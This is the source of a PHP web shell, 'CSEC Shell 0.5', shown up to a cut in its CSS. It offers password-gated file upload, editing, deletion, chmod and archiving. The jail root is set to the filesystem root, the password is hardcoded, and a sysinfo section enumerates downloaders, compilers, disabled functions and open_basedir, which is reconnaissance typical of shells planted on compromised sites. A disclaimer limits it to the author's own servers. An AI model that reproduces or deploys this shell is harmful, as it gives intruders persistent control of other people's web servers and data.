<?php
/**
 * CSEC PHP Shell 0.5 (hardened, modular, no-session)
 * ----------------------------------------------------------
 * Safe, single-file Shell for YOUR OWN SERVERS ONLY.
 * - No PHP sessions; uses short-lived HMAC token (URL or HttpOnly cookie)
 * - Strict base directory jail; path-safe join; symlink escape prevention
 * - CHMOD (with optional recursive), Zip/Unzip (to current folder), Edit, Download, Delete, Upload
 * - New: Mkdir, New File, Copy/Move, Multi-select bulk delete/zip, Sort & Search, Inline rename
 * - Optional IP binding, CSRF tokens for mutating POST ops
 * - Clean dark UI (Inter + minimal CSS).
 *
 * ⚠️ SECURITY NOTES
 * - FOR AUTHORIZED, LEGAL USE ONLY. Do NOT deploy on third-party systems you don't own/control.
 * - Protect with a strong password. Serve behind HTTP auth or VPN where possible.
 * - Set BASE_DIR to your intended root. This script jails all operations to that root.
 */

// ===================== CONFIG ===================== //
const APP_NAME     = 'CSEC Shell 0.5';
const BASE_DIR     = DIRECTORY_SEPARATOR;                 // jail root (absolute)
const LOGIN_PASS   = 'enteraja';            // change me
const TOKEN_TTL    = 3600;                    // seconds (1h)
const BIND_IP      = false;                    // bind token to client IP
const USE_COOKIE   = true;                    // deliver token via HttpOnly cookie instead of URL
const COOKIE_NAME  = 'csec_fm_token';
const HASH_ALGO    = 'sha256';                // for HMAC

// Feature flags
const ENABLE_EDIT        = true;
const ENABLE_UPLOAD      = true;
const ENABLE_ZIP         = true;
const ENABLE_UNZIP       = true;
const ENABLE_CHMOD       = true;
const ENABLE_NEWFILE     = true;
const ENABLE_MKDIR       = true;
const ENABLE_COPYMOVE    = true;
const ENABLE_BULK        = true;

// ================== RUNTIME & HELPERS ================== //
error_reporting(0);
set_time_limit(0);
mb_internal_encoding('UTF-8');

function h(?string $s): string { return htmlspecialchars($s ?? '', ENT_QUOTES, 'UTF-8'); }
function now(): int { return time(); }
function client_ip(): string { return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0'; }
function base(): string { return realpath(BASE_DIR) ?: __DIR__; }
function is_within_base(string $path): bool {
    $rp = realpath($path);
    $b  = base();
    if ($rp === false) return false;
    return strncmp($rp, $b, strlen($b)) === 0;
}
function safe_join(string $root, string $rel): string {
    $p = $root . DIRECTORY_SEPARATOR . ltrim($rel, DIRECTORY_SEPARATOR);
    $rp = realpath($p);
    if ($rp === false) {
        // If path doesn't exist yet (e.g., new file), normalize manually
        $stack = [];
        $parts = explode(DIRECTORY_SEPARATOR, $p);
        foreach ($parts as $seg) {
            if ($seg === '' || $seg === '.') continue;
            if ($seg === '..') array_pop($stack); else $stack[] = $seg;
        }
        $rp = DIRECTORY_SEPARATOR . implode(DIRECTORY_SEPARATOR, $stack);
    }
    return $rp;
}
function fmt_size($bytes): string {
    $u=['B','KB','MB','GB','TB']; $i=0; $bytes = max(0,(float)$bytes);
    while($bytes>=1024 && $i<count($u)-1){$bytes/=1024; $i++;}
    return sprintf('%.2f %s',$bytes,$u[$i]);
}
function perms_to_string(string $path): string {
    $perms = @fileperms($path); if ($perms===false) return '---------';
    $tmap=[0xC000=>'s',0xA000=>'l',0x8000=>'-',0x6000=>'b',0x4000=>'d',0x2000=>'c',0x1000=>'p'];
    $tc=$tmap[$perms & 0xF000] ?? '?';
    $own=(($perms&0x0100)?'r':'-').(($perms&0x0080)?'w':'-').(($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-'));
    $grp=(($perms&0x0020)?'r':'-').(($perms&0x0010)?'w':'-').(($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-'));
    $wld=(($perms&0x0004)?'r':'-').(($perms&0x0002)?'w':'-').(($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-'));
    return $tc.$own.$grp.$wld;
}
function octal_perm(string $path): string {
    $p = @fileperms($path);
    if ($p === false) return '--';
    // Selalu 4 digit: special bit + rwx (contoh: 0755, 0644, 1755)
    return substr(sprintf('%o', $p), -4);
}
function is_editable_ext(string $path): bool {
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    return in_array($ext, ['txt','php','html','htm','css','js','json','xml','env','md','ini','conf','log','sh','py','rb','go','rs','yml','yaml','sql']);
}
function send_download(string $file): void {
    if (!is_file($file)) return; 
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Content-Length: '.filesize($file));
    readfile($file); exit;
}

// ================== TOKEN AUTH (no session) ================== //
function pass_hash(): string { return password_hash(LOGIN_PASS, PASSWORD_DEFAULT); }
// To avoid recalculating new salt every request, derive a static secret from LOGIN_PASS
function secret_key(): string { return hash(HASH_ALGO, LOGIN_PASS.'|'.base(), true); }
function make_token(): string {
    $payload = [
        'iat'=>now(), 'exp'=>now()+TOKEN_TTL,
        'ip'=>BIND_IP? client_ip():''
    ];
    $j = json_encode($payload);
    $sig = hash_hmac(HASH_ALGO, $j, secret_key(), true);
    return rtrim(strtr(base64_encode($j),'+/','-_'),'=').'.'.rtrim(strtr(base64_encode($sig),'+/','-_'),'=');
}
function check_token(string $tok): bool {
    $parts = explode('.', $tok); if (count($parts)!==2) return false;
    [$j64,$s64] = $parts;
    $j = base64_decode(strtr($j64,'-_','+/'));
    $s = base64_decode(strtr($s64,'-_','+/'));
    if (!$j || !$s) return false;
    $calc = hash_hmac(HASH_ALGO, $j, secret_key(), true);
    if (!hash_equals($calc,$s)) return false;
    $pl = json_decode($j,true);
    if (!is_array($pl)) return false;
    if (($pl['exp']??0) < now()) return false;
    if (BIND_IP && ($pl['ip']??'') !== client_ip()) return false;
    return true;
}
function current_token(): ?string {
    if (USE_COOKIE && isset($_COOKIE[COOKIE_NAME])) return $_COOKIE[COOKIE_NAME];
    if (isset($_GET['auth'])) return (string)$_GET['auth'];
    if (isset($_POST['auth'])) return (string)$_POST['auth'];
    return null;
}
function deliver_token(string $tok): void {
    if (USE_COOKIE) {
        setcookie(COOKIE_NAME, $tok, [
            'expires'=> time()+TOKEN_TTL,
            'path'   => '/',
            'secure' => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on',
            'httponly'=> true,
            'samesite'=> 'Lax',
        ]);
        header('Location: ?'); exit;
    } else {
        header('Location: ?auth='.urlencode($tok)); exit;
    }
}

// CSRF tanpa ketergantungan pada REQUEST_URI (stabil untuk semua action)
function csrf_token(string $scope = 'global'): string {
    $seed = current_token() ?: '';
    return hash_hmac(HASH_ALGO, 'csrf|'.$scope, secret_key().$seed);
}
function csrf_check(string $tok, string $scope = 'global'): bool {
    return hash_equals(csrf_token($scope), $tok);
}

function is_dirpath(string $p): bool { return @is_dir($p); }
function unique_path(string $path): string {
    if (!file_exists($path)) return $path;
    $dir  = dirname($path);
    $base = pathinfo($path, PATHINFO_FILENAME);
    $ext  = pathinfo($path, PATHINFO_EXTENSION);
    $ext  = $ext ? ('.'.$ext) : '';
    $i = 1;
    $candidate = $dir . DIRECTORY_SEPARATOR . $base . ' (copy)' . $ext;
    while (file_exists($candidate)) {
        $i++;
        $candidate = $dir . DIRECTORY_SEPARATOR . $base . " (copy {$i})" . $ext;
    }
    return $candidate;
}


// ================== LOGIN GATE ================== //
$tok = current_token();
if (!$tok || !check_token($tok)) {
    // Simple password POST -> issue token
    $err = false;
    if (($_SERVER['REQUEST_METHOD']??'GET')==='POST' && isset($_POST['pass'])) {
        if (hash_equals(LOGIN_PASS, (string)$_POST['pass'])) {
            deliver_token(make_token());
        } else { $err = true; }
    }
    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'
        .'<title>Login Shell</title>'
        .'<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>'
        .'<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">'
        .'<style>:root{--bg:#0e141b;--panel:#141b23;--border:#263241;--text:#e0e6ee;--muted:#7b8da1;--accent:#15c15d}*{box-sizing:border-box}html,body{height:100%}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui,Segoe UI,Roboto,Arial;display:flex;align-items:center;justify-content:center}.login{background:var(--panel);border:1px solid var(--border);border-radius:14px;width:320px;padding:22px;box-shadow:0 12px 30px rgba(0,0,0,.35)}.login h2{margin:0 0 14px;font-size:18px;color:#e8eef7}.login input{width:100%;padding:12px 14px;border-radius:10px;border:1px solid #2d3b4d;background:#0f1620;color:var(--text);outline:none}.btn{width:100%;background:var(--accent);border:0;color:#0b1117;border-radius:10px;padding:12px 14px;font-weight:700;cursor:pointer;margin-top:12px}.btn:hover{filter:brightness(1.05)}.error{margin-top:10px;background:#5c2b29;color:#fff;padding:10px 12px;border-radius:10px;font-size:14px}.brand{position:fixed;left:16px;bottom:12px;color:var(--muted);font-size:12px}</style></head><body>'
        .'<div class="login"><form method="POST"><input type="password" name="pass" placeholder="Enter password"><button class="btn" type="submit">Login</button>'
        .($err?'<div class="error">Wrong password!</div>':'').'</form></div><div class="brand">'.h(APP_NAME).'</div></body></html>';
    exit;
}

// Logout
if (isset($_GET['logout'])) {
    if (USE_COOKIE) setcookie(COOKIE_NAME,'',time()-3600,'/');
    header('Location: ?'); exit;
}

// ================== ROUTER ================== //
$flash = [];
$cwd_in  = $_GET['dir'] ?? $_POST['dir'] ?? null;
$start   = realpath(__DIR__) ?: base();   // mulai dari folder tempat file ini berada
$cwd     = $cwd_in ? realpath($cwd_in) : $start;
if ($cwd === false || !is_within_base($cwd)) $cwd = $start;

function flash($type,$msg){ global $flash; $flash[] = [$type,$msg]; }

// Mutating actions require CSRF
$mut = ($_SERVER['REQUEST_METHOD']??'GET')==='POST' || isset($_GET['delete']) || isset($_GET['zip']) || isset($_GET['unzip']) || isset($_GET['copy']) || isset($_GET['move']);
if ($mut && (!isset($_REQUEST['csrf']) || !csrf_check((string)$_REQUEST['csrf']))) {
    flash('error','Invalid CSRF token.');
} else {
    // ===== Upload =====
    if (ENABLE_UPLOAD && ($_SERVER['REQUEST_METHOD']??'GET')==='POST' && isset($_FILES['upload'])) {
        $name = basename($_FILES['upload']['name']);
        $dest = safe_join($cwd, $name);
        if (!is_within_base(dirname($dest))) flash('error','Path escape blocked.');
        elseif (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) flash('ok','Uploaded: '.h($name));
        else flash('error','Upload failed');
    }

    // ===== Rename =====
    if (isset($_POST['rename_from'], $_POST['rename_to'])) {
        $from = realpath($_POST['rename_from']);
        $to   = safe_join(dirname($from), $_POST['rename_to']);
        if (!$from || !is_within_base($from) || !is_within_base(dirname($to))) flash('error','Path invalid.');
        elseif (@rename($from,$to)) flash('ok','Renamed'); else flash('error','Rename failed');
    }

    // ===== New File =====
    if (ENABLE_NEWFILE && isset($_POST['newfile_name'])) {
        $fn = trim($_POST['newfile_name']); if ($fn!=='') {
            $dest = safe_join($cwd, $fn);
            if (!is_within_base(dirname($dest))) flash('error','Path invalid.');
            elseif (file_exists($dest)) flash('error','File exists.');
            else { if (@file_put_contents($dest, '')!==false) flash('ok','File created'); else flash('error','Create failed'); }
        }
    }

    // ===== Mkdir =====
    if (ENABLE_MKDIR && isset($_POST['mkdir_name'])) {
        $dn = trim($_POST['mkdir_name']); if ($dn!=='') {
            $dest = safe_join($cwd, $dn);
            if (!is_within_base(dirname($dest))) flash('error','Path invalid.');
            elseif (@mkdir($dest, 0755, true)) flash('ok','Folder created'); else flash('error','Mkdir failed');
        }
    }

    // ===== CHMOD =====
    if (ENABLE_CHMOD && isset($_POST['chmod_path'], $_POST['chmod_mode'])) {
        $target    = realpath($_POST['chmod_path']);
        $mode_in   = ltrim(strtolower(trim($_POST['chmod_mode'])), '0o');
        $recursive = !empty($_POST['chmod_recursive']);

        if (!$target || !is_within_base($target)) {
            flash('error','Path invalid.');
        } elseif (!preg_match('/^[0-7]{3,4}$/', $mode_in)) {
            flash('error','Bad mode.');
        } else {
            $mode  = intval($mode_in, 8);
            $apply = function($p) use ($mode) { @chmod($p, $mode); };

            if ($recursive && is_dir($target)) {
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($target, FilesystemIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                foreach ($it as $p) {
                    $apply($p->getPathname());
                }
                $apply($target);
            } else {
                $apply($target);
            }

            flash('ok','Permissions updated');
        }
    }


    // ===== Delete (file or dir) =====
    if (isset($_GET['delete'])) {
        $target = realpath($_GET['delete']);
        if ($target && is_within_base($target)) {
            $ok = true;

            if (is_dir($target)) {
                // Hapus isi folder dulu (child-first), baru folder-nya
                try {
                    $it = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($target, FilesystemIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::CHILD_FIRST
                    );
                    foreach ($it as $f) {
                        $path = $f->getPathname();
                        if ($f->isDir()) { $ok = @rmdir($path); }
                        else            { $ok = @unlink($path); }
                        if (!$ok) break;
                    }
                    if ($ok) { $ok = @rmdir($target); }
                } catch (Throwable $e) {
                    $ok = false;
                }
            } else {
                // File biasa
                $ok = @unlink($target);
            }

            flash($ok ? 'ok' : 'error', $ok ? 'Deleted' : 'Delete failed');
        } else {
            flash('error','Path invalid.');
        }
    }


    // ===== Bulk Delete =====
    if (ENABLE_BULK && isset($_POST['bulk_delete']) && isset($_POST['items']) && is_array($_POST['items'])) {
        $count=0; foreach ($_POST['items'] as $itp) {
            $p = realpath($itp); if (!$p || !is_within_base($p)) continue;
            if (is_dir($p)) {
                $rit = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
                foreach ($rit as $f) { if (is_dir($f)) @rmdir($f); else @unlink($f); }
                if (@rmdir($p)) $count++;
            } else { if (@unlink($p)) $count++; }
        }
        flash('ok',"Bulk deleted: $count item(s)");
    }

    // ===== Download =====
    if (isset($_GET['download'])) {
        $f = realpath($_GET['download']);
        if ($f && is_file($f) && is_within_base($f)) { send_download($f); }
    }

    // ===== Edit Save =====
    if (ENABLE_EDIT && isset($_POST['savefile'], $_POST['filecontent'], $_POST['filepath'])) {
        $f = realpath($_POST['filepath']);
        if ($f && is_within_base($f)) {
            if (@file_put_contents($f, (string)$_POST['filecontent']) !== false) flash('ok','Saved'); else flash('error','Save failed');
        } else flash('error','Path invalid.');
    }

    // ===== Unzip (to current $cwd) =====
    if (ENABLE_UNZIP && isset($_GET['unzip'])) {
        if (!class_exists('ZipArchive')) { flash('error','ZIP ext not loaded'); }
        else {
            $z = realpath($_GET['unzip']);
            if ($z && is_file($z) && is_within_base($z) && strtolower(pathinfo($z, PATHINFO_EXTENSION))==='zip') {
                $zip = new ZipArchive();
                if ($zip->open($z) === TRUE) {
                    for ($i=0; $i<$zip->numFiles; $i++) {
                        $name = $zip->getNameIndex($i);
                        $target = safe_join($cwd, $name);
                        if (!is_within_base($target)) { $zip->close(); flash('error','Zip contains unsafe paths.'); goto _end_unzip; }
                    }
                    $zip->extractTo($cwd); $zip->close(); flash('ok','Unzipped to current folder');
                } else flash('error','Unzip failed');
            } else flash('error','Path invalid or not a zip.');
        }
        _end_unzip:;
    }

    // ===== Zip (single path to path.zip) =====
    if (ENABLE_ZIP && isset($_GET['zip'])) {
        $src = realpath($_GET['zip']);
        if ($src && is_within_base($src)) {
            $dest = $src . '.zip';
            if (zip_it($src, $dest)) flash('ok','Created '.h(basename($dest))); else flash('error','Zip failed');
        } else flash('error','Path invalid.');
    }

    // ===== Copy / Move (robust, folder-aware + auto-rename + diagnosa) =====
    if (ENABLE_COPYMOVE && isset($_POST['op']) && in_array($_POST['op'], ['copy','move'], true) && isset($_POST['src'], $_POST['dst'])) {
        $src = realpath($_POST['src']);
        $dst_in = $_POST['dst'];

        if (!$src || !is_within_base($src)) {
            flash('error', 'Path invalid (src).');
        } else {
            // Jika $dst_in sudah absolut & di dalam jail → pakai apa adanya, else relatif ke $cwd
            $dst = is_within_base($dst_in) ? $dst_in : safe_join($cwd, $dst_in);

            // Jika tujuan adalah folder yg EXIST → realpath-kan agar stabil
            // (kalau folder belum ada, tetap biarkan sebagai string target file baru)
            if (@is_dir($dst)) {
                $rp = realpath($dst);
                if ($rp !== false) $dst = $rp;
            }

            // Kalau tujuan folder → tambahkan basename(src)
            if (@is_dir($dst)) {
                $dst = rtrim($dst, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($src);
            }

            // Hindari overwrite: buat nama unik jika sudah ada
            $dst_final = unique_path($dst);

            // Validasi jail & hak tulis
            // Validasi jail & hak tulis (pakai probe nyata, plus debug rinci)
            $dst_dir = dirname($dst_final);
            if (!is_within_base($dst_dir)) {
                flash('error', 'Path invalid (dst).');
            } elseif (!@is_dir($dst_dir)) {
                flash('error', 'Destination directory does not exist.');
            } else {
                $probe_err = '';
                $writable  = can_write_dir($dst_dir, $probe_err);

                if (!$writable) {
                    [$ou,$og,$uid,$gid] = owner_group($dst_dir);
                    $info = sprintf(
                    'Destination not writable. Dir=%s perm=%s owner=%s(%d):%s(%d) proc=%s%s',
                    h($dst_dir), h(oct_mode($dst_dir)), h($ou), $uid, h($og), $gid, h(running_user()),
                    $probe_err ? ' — '.$probe_err : ''
                    );
                    flash('error', $info);

                } else {
                    // lanjut copy/move
                    $ok = true; $err = null;

                    if (is_dir($src)) {
                        $ok = recurse_copy($src, $dst_final);
                        if (!$ok) $err = error_get_last();
                    } else {
                        $ok = copy($src, $dst_final);
                        if (!$ok) $err = error_get_last();
                    }

                    if ($ok && $_POST['op'] === 'move') {
                        if (is_dir($src)) recurse_delete($src); else @unlink($src);
                    }

                    if ($ok) {
                        flash('ok', ucfirst($_POST['op']).' done: '.h(basename($dst_final)));
                    } else {
                        $msg = ' failed'; if (!empty($err['message'])) $msg .= ' — '.$err['message'];
                        flash('error', ucfirst($_POST['op']).$msg);
                    }
                }
            }

        }
    }

    // ===== Bulk Zip =====
    if (ENABLE_BULK && isset($_POST['bulk_zip']) && isset($_POST['items']) && is_array($_POST['items'])) {
        $dest = safe_join($cwd, 'bulk-'.date('Ymd-His').'.zip');
        if (!is_within_base(dirname($dest))) { flash('error','Path invalid.'); }
        else if (!extension_loaded('zip')) { flash('error','ZIP ext not loaded'); }
        else {
            $zip = new ZipArchive(); if ($zip->open($dest, ZipArchive::CREATE|ZipArchive::OVERWRITE)!==true){ flash('error','Zip open failed'); }
            else {
                foreach ($_POST['items'] as $it) {
                    $rp = realpath($it); if (!$rp || !is_within_base($rp)) continue;
                    add_to_zip($zip, $rp, basename($rp));
                }
                $zip->close(); flash('ok','Created '.h(basename($dest)));
            }
        }
    }
}

function running_user(): string {
    if (function_exists('posix_geteuid') && function_exists('posix_getpwuid')) {
        $uid = posix_geteuid();
        $u = posix_getpwuid($uid);
        return ($u['name'] ?? (string)$uid) . "($uid)";
    }
    return 'unknown';
}

function oct_mode($path): string {
    $p = @fileperms($path); if ($p===false) return '----';
    return '0'.substr(sprintf('%o',$p), -3);
}
function owner_group($path): array {
    $uid = @fileowner($path); $gid = @filegroup($path);
    $u = function_exists('posix_getpwuid') ? (posix_getpwuid($uid)['name'] ?? (string)$uid) : (string)$uid;
    $g = function_exists('posix_getgrgid') ? (posix_getgrgid($gid)['name'] ?? (string)$gid) : (string)$gid;
    return [$u,$g,$uid,$gid];
}
function can_write_dir($dir, &$why = ''): bool {
    // coba bikin file dummy untuk memastikan benar2 bisa write
    $probe = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . '.csecw_' . bin2hex(random_bytes(4));
    $fp = @fopen($probe, 'w');
    if ($fp === false) {
        $e = error_get_last(); $why = $e['message'] ?? 'fopen failed';
        return false;
    }
    fclose($fp); @unlink($probe);
    return true;
}


// Helpers for zip/copy
function zip_it($source,$destination){
    if (!extension_loaded('zip')) return false; $zip = new ZipArchive();
    if (!$zip->open($destination, ZipArchive::CREATE|ZipArchive::OVERWRITE)) return false;
    $source = realpath($source);
    if (is_dir($source)) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($files as $file) {
            $file = realpath($file);
            $local = substr($file, strlen($source)+1);
            if (is_dir($file)) $zip->addEmptyDir($local); else $zip->addFile($file, $local);
        }
    } else { $zip->addFile($source, basename($source)); }
    return $zip->close();
}
function add_to_zip(ZipArchive $zip, string $path, string $base): void {
    if (is_dir($path)) {
        $zip->addEmptyDir($base);
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($it as $f) {
            $rp = realpath($f); if ($rp===false) continue;
            $local = $base.'/'.substr($rp, strlen($path)+1);
            if (is_dir($rp)) $zip->addEmptyDir($local); else $zip->addFile($rp,$local);
        }
    } else { $zip->addFile($path,$base); }
}
function recurse_copy($src,$dst): bool {
    if (is_file($src)) return @copy($src,$dst);
    if (!is_dir($dst) && !@mkdir($dst,0755,true)) return false;
    $it = new DirectoryIterator($src);
    foreach ($it as $fi) {
        if ($fi->isDot()) continue; $sp = $fi->getPathname(); $dp = $dst.DIRECTORY_SEPARATOR.$fi->getFilename();
        if ($fi->isDir()) { if (!recurse_copy($sp,$dp)) return false; }
        else { if (!@copy($sp,$dp)) return false; }
    }
    return true;
}
function recurse_delete($path): void {
    if (is_file($path)) { @unlink($path); return; }
    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
    foreach ($it as $f) { if (is_dir($f)) @rmdir($f); else @unlink($f); }
    @rmdir($path);
}

// ================== LISTING, SEARCH & SORT ================== //
$search = trim((string)($_GET['q'] ?? ''));
$sort   = (string)($_GET['sort'] ?? 'name');    // name|size|mtime|type
$order  = (string)($_GET['order'] ?? 'asc');     // asc|desc

$items = [];
$scandir = @scandir($cwd) ?: [];
foreach ($scandir as $name) {
    if ($name==='.' ) continue; if ($name==='..' && $cwd===base()) continue; // allow .. except at root
    $path = realpath($cwd.DIRECTORY_SEPARATOR.$name); if (!$path) continue;
    if (!is_within_base($path)) continue; // symlink escape guard
    if ($search!=='' && stripos($name,$search)===false) continue;
    $items[] = [
        'name'=>$name,
        'path'=>$path,
        'is_dir'=>is_dir($path),
        'size'=> is_file($path)? filesize($path):0,
        'mtime'=> filemtime($path) ?: 0,
        'type'=> strtolower(pathinfo($path, PATHINFO_EXTENSION) ?: ($path==='..'?'..':'dir')),
    ];
}
// sort
usort($items, function($a,$b) use($sort,$order){
    // folders first
    if ($a['is_dir']!==$b['is_dir']) return $a['is_dir']? -1:1;
    $cmp = 0;
    if ($sort==='size') $cmp = $a['size']<=>$b['size'];
    elseif ($sort==='mtime') $cmp = $a['mtime']<=>$b['mtime'];
    elseif ($sort==='type') $cmp = strcmp($a['type'],$b['type']);
    else $cmp = strcasecmp($a['name'],$b['name']);
    return $order==='desc'? -$cmp : $cmp;
});

// ===== SYSINFO helpers =====
function sys_server_ip(): string {
    // prioritas: SERVER_ADDR → IPv6/IPv4 dari host → 127.0.0.1 fallback
    $addr = $_SERVER['SERVER_ADDR'] ?? '';
    if ($addr) return $addr;
    $host = $_SERVER['SERVER_NAME'] ?? php_uname('n');
    // gethostbyname hanya IPv4; kalau gagal, tetap tampilkan hostname
    $ipv4 = @gethostbyname($host);
    return $ipv4 && $ipv4 !== $host ? $ipv4 : $host;
}
function sys_client_ip(): string {
    // ambil IP real dari proxy umum (tanpa parsing rumit)
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_REAL_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            $v = $_SERVER[$k];
            if ($k==='HTTP_X_FORWARDED_FOR') { $v = trim(explode(',', $v)[0]); }
            return $v;
        }
    }
    return 'unknown';
}
function sys_disk_info(string $root): array {
    $total = @disk_total_space($root) ?: 0;
    $free  = @disk_free_space($root) ?: 0;
    $usedp = $total>0 ? (int)round(100 - ($free/$total*100)) : 0;
    return [$total, $free, $usedp];
}
function sys_bin_in_path(string $bin): bool {
    $path = getenv('PATH') ?: '';
    foreach (explode(PATH_SEPARATOR, $path) as $dir) {
        $f = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $bin;
        if (@is_file($f) && @is_executable($f)) return true;
        // beberapa distro menyimpan alternatif dengan ekstensi
        if (@is_file($f.'.exe') && @is_executable($f.'.exe')) return true;
    }
    return false;
}
function sys_list_present(array $bins): string {
    $have = [];
    foreach ($bins as $b) if (sys_bin_in_path($b)) $have[] = $b;
    return $have ? implode(' ', $have) : '—';
}
function sys_disable_functions(): string {
    $df = trim((string)ini_get('disable_functions'));
    return $df !== '' ? $df : 'All Functions Accessible';
}
function sysinfo_collect(): array {
    // user & group (fallback aman kalau POSIX dimatikan)
    $uid = function_exists('posix_geteuid') ? @posix_geteuid() : @getmyuid();
    $gid = function_exists('posix_getegid') ? @posix_getegid() : @getmygid();
    $uname = (function_exists('posix_getpwuid') && $uid!==false) ? (posix_getpwuid($uid)['name'] ?? (string)$uid) : (string)$uid;
    $gname = (function_exists('posix_getgrgid') && $gid!==false) ? (posix_getgrgid($gid)['name'] ?? (string)$gid) : (string)$gid;

    [$dTotal,$dFree,$dUsedP] = sys_disk_info(base());

    return [
        'uname'   => php_uname(),                       // lengkap: OS, host, kernel
        'uid'     => $uid, 'user' => $uname,
        'gid'     => $gid, 'group'=> $gname,
        'php'     => PHP_VERSION,
        'safe'    => 'OFF', // safe_mode sudah deprecated sejak PHP 5.4
        'srv_ip'  => sys_server_ip(),
        'cli_ip'  => sys_client_ip(),
        'dt'      => date('Y-m-d H:i:s'),
        'disk'    => ['total'=>$dTotal, 'free'=>$dFree, 'usedp'=>$dUsedP],
        'useful'  => sys_list_present(['gcc','clang','make','php','perl','python3','python','ruby','tar','gzip','bzip2','zip','unzip','node','npm','composer']),
        'downldr' => sys_list_present(['wget','curl','lynx','links','fetch','lwp-mirror']),
        'disabled'=> sys_disable_functions(),
        'ext'     => [
            'curl'  => extension_loaded('curl')  ? 'ON':'OFF',
            'ssh2'  => extension_loaded('ssh2')  ? 'ON':'OFF',
            'mysql' => (extension_loaded('mysqli')||extension_loaded('pdo_mysql')) ? 'ON':'OFF',
            'pgsql' => (extension_loaded('pgsql') ||extension_loaded('pdo_pgsql')) ? 'ON':'OFF',
            'oci8'  => (extension_loaded('oci8') ||extension_loaded('pdo_oci'))   ? 'ON':'OFF',
        ],
        'cgi'     => (stripos(PHP_SAPI,'cgi')!==false ? 'ON':'OFF'),
        'openbd'  => ini_get('open_basedir') ?: 'NONE',
        'sm_exec' => ini_get('safe_mode_exec_dir') ?: 'NONE',
        'sm_inc'  => ini_get('safe_mode_include_dir') ?: 'NONE',
    ];
}

// ================== VIEW ================== //
$csrf = csrf_token();
$token_query = USE_COOKIE ? '' : ('&auth='.urlencode($tok));

?><!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title><?= h(APP_NAME) ?></title>
<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<style>
:root{--bg:#0e141b;--panel:#141b23;--accent:#15c15d;--muted:#7b8da1;--text:#e0e6ee;--border:#243245}
*{box-sizing:border-box}
body{margin:16px;background:var(--bg);color:var(--text);font-family:Inter,system-ui,Segoe UI,Roboto,Arial}
h2{margin:6px 0 14px}
a{color:#8bd3ff;text-decoration:none}
a:hover{text-decoration:underline}
.box{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:14px;margin-bottom:12px}
input[type=text],input[type=file],textarea{width:100%;background:#0f1620;border:1px solid var(--border);border-radius:8px;color:var(--text);padding:8px 10px}
.btn{background:var(--accent);border:0;color:#0b1117;border-radius:8px;padding:6px 12px;font-weight:600;cursor:pointer;font-size:13px}
.btn.secondary{background:#2e3a48;color:#e0e6ee}
.btn:hover{filter:brightness(1.05)}
.table{width:100%;border-collapse:collapse}
.table th,.table td{padding:8px 10px;border-bottom:1px solid var(--border);vertical-align:middle}
.table th{color:#9db1c8;text-align:left}
.badge{font-family:monospace;background:#0f1620;border:1px solid var(--border);padding:2px 6px;border-radius:6px}
.flex{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
.right{margin-left:auto}
.actions a,.actions form{display:inline-block;margin-right:8px}
.actions input[type=text]{width:140px}
.logout{color:#ff8080}
.path a{color:#e0e6ee}
.path span{color:#9db1c8}
.flash-ok{padding:8px 10px;border-radius:8px;background:#0f5132;color:#fff;margin-bottom:8px}
.flash-err{padding:8px 10px;border-radius:8px;background:#5c2b29;color:#fff;margin-bottom:8px}
.chk{width:18px;height:18px}
.search{min-width:220px}
/* SweetAlert dark theme + tidy input */
.swal2-popup{
  background:#141b23 !important;
  color:#e0e6ee !important;
  border:1px solid var(--border);
  border-radius:12px;
}
.swal2-title{ color:#e0e6ee !important; }
.swal2-html-container{ color:#9db1c8 !important; }

.swal2-input{
  background:#0f1620 !important;
  color:#e0e6ee !important;
  border:1px solid var(--border) !important;
  border-radius:8px !important;
  padding:10px 12px !important;
}

.swal2-actions .swal2-confirm{
  background:var(--accent) !important;
  color:#0b1117 !important;
  border-radius:8px !important;
  padding:8px 14px !important;
  font-weight:600 !important;
}
.swal2-actions .swal2-cancel,
